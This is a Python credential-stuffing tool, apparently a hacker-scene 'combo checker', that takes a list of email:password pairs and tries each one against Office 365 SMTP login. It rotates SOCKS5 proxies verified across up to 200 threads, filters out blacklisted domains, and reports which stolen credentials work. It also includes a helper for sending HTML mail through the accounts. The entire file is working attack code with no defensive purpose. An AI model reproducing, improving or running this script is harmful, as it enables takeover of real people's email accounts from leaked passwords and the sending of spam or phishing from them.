#!/usr/bin/env python

import smtplib
import threading
from colorama import Fore, Back, Style
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socks
import socket

os.system('cls' if os.name == 'nt' else 'clear')

def send_html_email(subject, html_content, from_email, password, to_email, proxy=None):
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = to_email
    part = MIMEText(html_content, 'html')
    msg.attach(part)

    try:
        if proxy:
            proxy_ip, proxy_port = proxy.split(':')
            socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            socket.socket = socks.socksocket
        
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.starttls()
        server.login(from_email, password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
    except Exception as e:
        print(Fore.MAGENTA + f'3RR0RR M41L !!!  Let celebrate it!!!!' + Style.RESET_ALL)

def check_proxy(proxy):
    print(f'=> Checking Proxy => {proxy}')
    try:
        proxy_ip, proxy_port = proxy.split(':')
        socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.starttls()
        server.quit()
        print(Fore.GREEN + f'=> WORKED !!!! PROxies ==> {proxy}' + Style.RESET_ALL)
        return True
    except Exception:
        print(Fore.RED + f'=> Crazies DAMN DEAD PROxies ==> {proxy}' + Style.RESET_ALL)
        return False

def proxy_checker_thread(proxies, valid_proxies):
    while proxies:
        proxy = proxies.pop(0)
        if check_proxy(proxy):
            valid_proxies.append(proxy)

def validate_combo(combo, proxy=None):
    username, password = [x.strip() for x in combo.split(':')]
    try:
        if proxy:
            proxy_ip, proxy_port = proxy.split(':')
            socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            socket.socket = socks.socksocket
        
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.starttls()
        server.login(username, password)
        print(Fore.GREEN + f'SMTP WORKED !!!! : {combo}' + Style.RESET_ALL)
        server.quit()
    except smtplib.SMTPAuthenticationError:
        print(Fore.MAGENTA + f'3RR0RR => {combo}' + Style.RESET_ALL)
    except Exception as e:
        print(Fore.MAGENTA + f'Combo 3RR0RR!!! Let celebrate it!!!!' + Style.RESET_ALL)

def process_file(file_path, proxy_file_path=None):
    proxies = []
    if proxy_file_path:
        with open(proxy_file_path, 'r') as proxy_file:
            proxies = [line.strip() for line in proxy_file]

    valid_proxies = []
    if proxies:
        threads = []
        num_threads = min(len(proxies), 200)
        for _ in range(num_threads):
            thread = threading.Thread(target=proxy_checker_thread, args=(proxies, valid_proxies))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        if valid_proxies:
            with open('working_proxies.txt', 'w') as f:
                for proxy in valid_proxies:
                    f.write(proxy + '\n')
            print(Fore.GREEN + 'W0RK PROxies Saved' + Style.RESET_ALL)
        else:
            print(Fore.RED + 'NO BUY PROxies BR0!!!! Cheers!!!.' + Style.RESET_ALL)

    with open(file_path, 'r') as f:
        combos = f.read().splitlines()

    unique_combos = set(combos)
    with open('BlackList.txt', 'r') as file:
        blacklist = file.read().splitlines()

    valid_combos = []
    for combo in unique_combos:
        domain = combo.split(':')[0].split('@')[1].strip()
        if domain not in blacklist:
            valid_combos.append(combo)

    for combo in valid_combos:
        proxy = valid_proxies.pop(0) if valid_proxies else None
        validate_combo(combo, proxy)

banner = '╔═╦═╦╦═╦╦═╗╔═╦╦══╦══╦╦╗\n║╩║║║║║║║╩║║╚║╠╗╔╩╗╔╩╗║\n╚╩╩╩═╩╩═╩╩╝╚═╩╝╚╝ ╚╝ ╚╝'
ban = f'{banner}\n\n By : AnnaQitty'
print(Fore.LIGHTGREEN_EX + ban + Style.RESET_ALL)

file_path = input(Fore.RED + '+[+] ComboList : ' + Style.RESET_ALL)
proxy_file_path = input(Fore.LIGHTGREEN_EX + '+[+] ProxyList (optional) : ' + Style.RESET_ALL)
thread_user = int(input(Fore.LIGHTGREEN_EX + '+[+] Threads : ' + Style.RESET_ALL))

def threaded_task():
    process_file(file_path, proxy_file_path)

threads = []
for _ in range(thread_user):
    thread = threading.Thread(target=threaded_task)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print(Fore.LIGHTGREEN_EX + 'Good Job !! Completed Checked\n' + ban + Style.RESET_ALL)
